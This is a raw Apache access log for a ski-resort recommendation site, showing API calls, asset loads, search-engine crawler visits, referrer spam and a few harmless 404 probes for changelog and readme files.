52.33.40.213 - - [21/Mar/2016:00:59:39 -0700] "GET /lib/reccapi.php?resort=silverstarmountain HTTP/1.1" 200 933 "-" "node-superagent/1.4.0"
66.249.79.248 - - [21/Mar/2016:01:00:27 -0700] "GET /lib/reccapi.php?resort=aspenmountain&date=2016-03-17 HTTP/1.1" 200 1062 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.248 - - [21/Mar/2016:01:00:28 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=aspenmountain&dateStart=2016-03-15 HTTP/1.1" 200 872 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.248 - - [21/Mar/2016:01:00:28 -0700] "GET /lib/reccapi.php?fields=t&date=2016-03-17&coords=39.17%2C-106.8&size=7&sort=distance HTTP/1.1" 200 1365 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [21/Mar/2016:01:08:02 -0700] "GET /lib/reccapi.php?resort=sundayriver HTTP/1.1" 200 991 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:01:09:02 -0700] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 1053 "-" "node-superagent/1.4.0"
54.218.75.215 - - [21/Mar/2016:01:10:18 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.75.215 - - [21/Mar/2016:01:10:38 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1"
54.218.53.183 - - [21/Mar/2016:01:10:42 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:44 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:44 -0700] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4903 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:44 -0700] "GET /bower_components/requirejs/require.js HTTP/1.1" 200 6702 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:44 -0700] "GET /styles/ee08faa9.main.css HTTP/1.1" 200 19446 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:44 -0700] "GET /images/loading.gif HTTP/1.1" 200 13881 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:44 -0700] "GET /images/logo-square-white-sm.png HTTP/1.1" 200 1683 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:46 -0700] "GET /scripts/fa48e319.main.js HTTP/1.1" 200 123455 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:46 -0700] "GET /images/greyHeader.png HTTP/1.1" 200 508 "http://whereshouldiski.com/styles/ee08faa9.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:46 -0700] "GET /lib/reccapi.php?fields=t HTTP/1.1" 200 1783 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:46 -0700] "GET /images/star5.png HTTP/1.1" 200 1783 "http://whereshouldiski.com/styles/ee08faa9.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:46 -0700] "GET /images/bluebird5.png HTTP/1.1" 200 2177 "http://whereshouldiski.com/styles/ee08faa9.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:46 -0700] "GET /images/mtns-icon.png HTTP/1.1" 200 1097 "http://whereshouldiski.com/styles/ee08faa9.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:46 -0700] "GET /images/shading-icon.png HTTP/1.1" 200 537 "http://whereshouldiski.com/styles/ee08faa9.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:46 -0700] "GET /images/snowflake5.png HTTP/1.1" 200 2857 "http://whereshouldiski.com/styles/ee08faa9.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:47 -0700] "GET /favicon.ico HTTP/1.1" 200 4612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
54.218.53.183 - - [21/Mar/2016:01:10:56 -0700] "GET /images/button.png HTTP/1.1" 200 599 "http://whereshouldiski.com/styles/ee08faa9.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
170.75.162.130 - - [21/Mar/2016:01:14:32 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 1057 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:01:20:23 -0700] "GET /lib/reccapi.php?resort=brighton HTTP/1.1" 200 1004 "-" "node-superagent/1.4.0"
66.249.79.241 - - [21/Mar/2016:01:28:53 -0700] "GET /lib/reccapi.php?resort=arapahoebasin&date=2016-03-17 HTTP/1.1" 200 1121 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.241 - - [21/Mar/2016:01:28:54 -0700] "GET /lib/reccapi.php?fields=t&date=2016-03-17&coords=39.68%2C-105.88&size=7&sort=distance HTTP/1.1" 200 1379 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.135 - - [21/Mar/2016:01:28:54 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=arapahoebasin&dateStart=2016-03-15 HTTP/1.1" 200 885 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.149 - - [21/Mar/2016:01:29:07 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.141 - - [21/Mar/2016:01:29:57 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.79.241 - - [21/Mar/2016:01:39:22 -0700] "GET /lib/reccapi.php?resort=aspenheights&date=2016-03-17 HTTP/1.1" 200 1077 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.135 - - [21/Mar/2016:01:39:23 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=aspenheights&dateStart=2016-03-15 HTTP/1.1" 200 875 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.241 - - [21/Mar/2016:01:39:23 -0700] "GET /lib/reccapi.php?fields=t&date=2016-03-17&coords=39.14%2C-106.91&size=7&sort=distance HTTP/1.1" 200 1374 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.75.78.166 - - [21/Mar/2016:01:40:05 -0700] "GET /robots.txt HTTP/1.1" 200 419 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)"
77.75.78.166 - - [21/Mar/2016:01:40:06 -0700] "GET /resorts?resort=mountainhigh HTTP/1.1" 404 506 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)"
170.75.162.130 - - [21/Mar/2016:01:52:26 -0700] "GET /lib/reccapi.php?resort=angelfire HTTP/1.1" 200 976 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:01:52:26 -0700] "GET /lib/reccapi.php?resort=taos HTTP/1.1" 200 953 "-" "node-superagent/1.4.0"
172.1.120.107 - - [21/Mar/2016:01:58:29 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
178.137.88.222 - - [21/Mar/2016:02:00:17 -0700] "GET / HTTP/1.1" 200 6976 "http://zarabotat-na-sajte.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 4.0) Opera 7.0 [en]"
178.137.88.222 - - [21/Mar/2016:02:00:19 -0700] "GET / HTTP/1.1" 200 6976 "http://zarabotat-na-sajte.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 4.0) Opera 7.0 [en]"
66.249.79.248 - - [21/Mar/2016:02:12:52 -0700] "GET /lib/reccapi.php?resort=mountbaker&date=2016-02-22 HTTP/1.1" 200 1107 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.241 - - [21/Mar/2016:02:12:54 -0700] "GET /lib/reccapi.php?fields=t&date=2016-02-22&coords=48.86%2C-121.68&size=7&sort=distance HTTP/1.1" 200 1418 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.241 - - [21/Mar/2016:02:12:54 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=mountbaker&dateStart=2016-02-20 HTTP/1.1" 200 876 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [21/Mar/2016:02:16:09 -0700] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 1046 "-" "node-superagent/1.4.0"
185.7.39.137 - - [21/Mar/2016:02:18:46 -0700] "GET / HTTP/1.0" 200 6995 "-" "-"
185.7.39.137 - - [21/Mar/2016:02:19:11 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
185.7.39.137 - - [21/Mar/2016:02:19:36 -0700] "GET /CHANGELOG.txt HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
185.7.39.137 - - [21/Mar/2016:02:20:00 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
185.7.39.137 - - [21/Mar/2016:02:20:25 -0700] "GET /readme.html HTTP/1.1" 404 466 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
52.33.40.213 - - [21/Mar/2016:02:22:03 -0700] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 994 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:02:25:00 -0700] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
5.135.186.134 - - [21/Mar/2016:02:26:59 -0700] "GET / HTTP/1.0" 200 6995 "-" "-"
5.135.186.134 - - [21/Mar/2016:02:26:59 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/20100101 Firefox/43.0"
5.135.186.134 - - [21/Mar/2016:02:27:00 -0700] "GET /CHANGELOG.txt HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/20100101 Firefox/43.0"
5.135.186.134 - - [21/Mar/2016:02:27:01 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
5.135.186.134 - - [21/Mar/2016:02:27:02 -0700] "GET /readme.html HTTP/1.1" 404 466 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
180.76.15.162 - - [21/Mar/2016:02:30:59 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.146 - - [21/Mar/2016:02:31:51 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
52.33.40.213 - - [21/Mar/2016:02:39:44 -0700] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1106 "-" "node-superagent/1.4.0"
66.249.79.248 - - [21/Mar/2016:02:47:32 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
208.81.152.5 - - [21/Mar/2016:02:56:03 -0700] "GET / HTTP/1.0" 200 6995 "-" "-"
208.81.152.5 - - [21/Mar/2016:02:56:04 -0700] "GET /CHANGELOG.txt HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36"
208.81.152.5 - - [21/Mar/2016:02:56:05 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"
208.81.152.5 - - [21/Mar/2016:02:56:05 -0700] "GET /readme.html HTTP/1.1" 404 466 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"
66.249.74.58 - - [21/Mar/2016:02:57:24 -0700] "GET /styles/ee08faa9.main.css HTTP/1.1" 200 19447 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
151.80.31.157 - - [21/Mar/2016:03:01:33 -0700] "GET /robots.txt HTTP/1.1" 200 363 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
170.75.162.130 - - [21/Mar/2016:03:10:15 -0700] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1063 "-" "node-superagent/1.4.0"
66.249.79.241 - - [21/Mar/2016:03:17:20 -0700] "GET /lib/reccapi.php?resort=hurricaneridge&date=2016-03-11 HTTP/1.1" 200 1092 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.241 - - [21/Mar/2016:03:17:21 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=hurricaneridge&dateStart=2016-03-09 HTTP/1.1" 200 878 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.241 - - [21/Mar/2016:03:17:22 -0700] "GET /lib/reccapi.php?fields=t&date=2016-03-11&coords=47.97%2C-123.51&size=7&sort=distance HTTP/1.1" 200 1412 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.241 - - [21/Mar/2016:03:17:28 -0700] "GET /lib/reccapi.php?resort=sugarbush&date=2015-12-31 HTTP/1.1" 200 708 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.135 - - [21/Mar/2016:03:23:36 -0700] "GET /resorts?resort=powderridge&date=2013-12-17 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.34 - - [21/Mar/2016:03:30:38 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
134.249.53.235 - - [21/Mar/2016:03:31:29 -0700] "GET / HTTP/1.1" 200 6976 "http://stairliftstrue.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90; Creative)"
134.249.53.235 - - [21/Mar/2016:03:31:29 -0700] "GET / HTTP/1.1" 200 6976 "http://stairliftstrue.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90; Creative)"
180.76.15.142 - - [21/Mar/2016:03:31:29 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
134.249.53.235 - - [21/Mar/2016:03:31:30 -0700] "GET / HTTP/1.1" 200 6976 "http://stairliftstrue.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90; Creative)"
173.230.149.125 - - [21/Mar/2016:03:51:25 -0700] "GET / HTTP/1.0" 200 6995 "-" "-"
173.230.149.125 - - [21/Mar/2016:03:51:30 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36"
173.230.149.125 - - [21/Mar/2016:03:51:36 -0700] "GET /CHANGELOG.txt HTTP/1.1" 404 470 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36"
173.230.149.125 - - [21/Mar/2016:03:51:41 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
173.230.149.125 - - [21/Mar/2016:03:51:47 -0700] "GET /readme.html HTTP/1.1" 404 466 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
52.33.40.213 - - [21/Mar/2016:04:00:08 -0700] "GET /lib/reccapi.php?resort=schweitzer HTTP/1.1" 200 1051 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:04:00:08 -0700] "GET /lib/reccapi.php?resort=mountbachelor HTTP/1.1" 200 1057 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:04:00:08 -0700] "GET /lib/reccapi.php?resort=mountspokane HTTP/1.1" 200 1092 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:04:01:08 -0700] "GET /lib/reccapi.php?resort=stevenspass HTTP/1.1" 200 1062 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:04:05:28 -0700] "GET /lib/reccapi.php?resort=snowbird HTTP/1.1" 200 990 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:04:10:12 -0700] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 991 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:04:25:24 -0700] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 982 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:04:28:14 -0700] "GET /lib/reccapi.php?resort=hoodoo HTTP/1.1" 200 1027 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:04:32:35 -0700] "GET /lib/reccapi.php?resort=devilshead HTTP/1.1" 200 969 "-" "node-superagent/1.4.0"
180.76.15.23 - - [21/Mar/2016:04:32:36 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
103.193.56.184 - - [21/Mar/2016:04:32:53 -0700] "GET / HTTP/1.1" 200 7032 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.x.x) Gecko/20041107 Firefox/x.x"
180.76.15.15 - - [21/Mar/2016:04:33:35 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
151.80.31.166 - - [21/Mar/2016:04:39:56 -0700] "GET /robots.txt HTTP/1.1" 200 363 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
68.180.231.28 - - [21/Mar/2016:04:52:47 -0700] "GET /robots.txt HTTP/1.1" 200 319 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
68.180.231.28 - - [21/Mar/2016:04:52:47 -0700] "GET /resorts?resort=whitefacemountain HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
134.249.53.235 - - [21/Mar/2016:04:55:02 -0700] "GET / HTTP/1.1" 200 6976 "http://rostov.xrus.org/" "Opera/7.11 (Windows NT 5.1; U) [en]"
134.249.53.235 - - [21/Mar/2016:04:55:02 -0700] "GET / HTTP/1.1" 200 6976 "http://rostov.xrus.org/" "Opera/7.11 (Windows NT 5.1; U) [en]"
52.33.40.213 - - [21/Mar/2016:04:57:21 -0700] "GET /lib/reccapi.php?resort=angelfire HTTP/1.1" 200 976 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:04:59:01 -0700] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 1046 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:05:01:28 -0700] "GET /lib/reccapi.php?resort=mounthoodmeadows HTTP/1.1" 200 1071 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:05:03:21 -0700] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 1055 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:05:05:11 -0700] "GET /lib/reccapi.php?resort=whitefacemountain HTTP/1.1" 200 1022 "-" "node-superagent/1.4.0"
68.180.231.28 - - [21/Mar/2016:05:10:07 -0700] "GET /resorts?resort=alyeska HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
170.75.162.130 - - [21/Mar/2016:05:12:50 -0700] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 1127 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:05:14:40 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 1064 "-" "node-superagent/1.4.0"
180.76.15.31 - - [21/Mar/2016:05:34:49 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.157 - - [21/Mar/2016:05:35:53 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [21/Mar/2016:05:46:13 -0700] "GET /lib/reccapi.php?resort=coppermountain HTTP/1.1" 200 1026 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:05:46:13 -0700] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 986 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:05:46:13 -0700] "GET /lib/reccapi.php?resort=loveland HTTP/1.1" 200 1021 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:05:46:13 -0700] "GET /lib/reccapi.php?resort=monarch HTTP/1.1" 200 975 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:05:46:13 -0700] "GET /lib/reccapi.php?resort=keystone HTTP/1.1" 200 1023 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:05:46:14 -0700] "GET /lib/reccapi.php?resort=arapahoebasin HTTP/1.1" 200 1037 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:05:47:14 -0700] "GET /lib/reccapi.php?resort=homewoodmountain HTTP/1.1" 200 1053 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:05:53:43 -0700] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 1000 "-" "node-superagent/1.4.0"
140.237.55.56 - - [21/Mar/2016:05:59:01 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
170.75.162.130 - - [21/Mar/2016:06:16:37 -0700] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 993 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:06:16:37 -0700] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 984 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:06:16:37 -0700] "GET /lib/reccapi.php?resort=buttermilk HTTP/1.1" 200 969 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:06:16:37 -0700] "GET /lib/reccapi.php?resort=snowmass HTTP/1.1" 200 965 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:06:17:47 -0700] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1107 "-" "node-superagent/1.4.0"
24.32.30.1 - - [21/Mar/2016:06:18:48 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
52.33.40.213 - - [21/Mar/2016:06:24:35 -0700] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1020 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:06:24:55 -0700] "GET /lib/reccapi.php?resort=mtrose HTTP/1.1" 200 1079 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:06:26:05 -0700] "GET /lib/reccapi.php?resort=homewoodmountain HTTP/1.1" 200 1053 "-" "node-superagent/1.4.0"
144.76.40.112 - - [21/Mar/2016:06:29:47 -0700] "GET / HTTP/1.1" 200 6976 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13"
180.76.15.33 - - [21/Mar/2016:06:30:03 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.16 - - [21/Mar/2016:06:30:56 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
75.32.230.36 - - [21/Mar/2016:06:32:16 -0700] "-" 408 0 "-" "-"
75.32.230.36 - - [21/Mar/2016:06:32:17 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [21/Mar/2016:06:42:30 -0700] "GET /lib/reccapi.php?resort=brighton HTTP/1.1" 200 974 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:06:46:36 -0700] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 985 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:06:46:36 -0700] "GET /lib/reccapi.php?resort=mounthoodmeadows HTTP/1.1" 200 1064 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:06:47:36 -0700] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1117 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:06:47:36 -0700] "GET /lib/reccapi.php?resort=snowmass HTTP/1.1" 200 965 "-" "node-superagent/1.4.0"
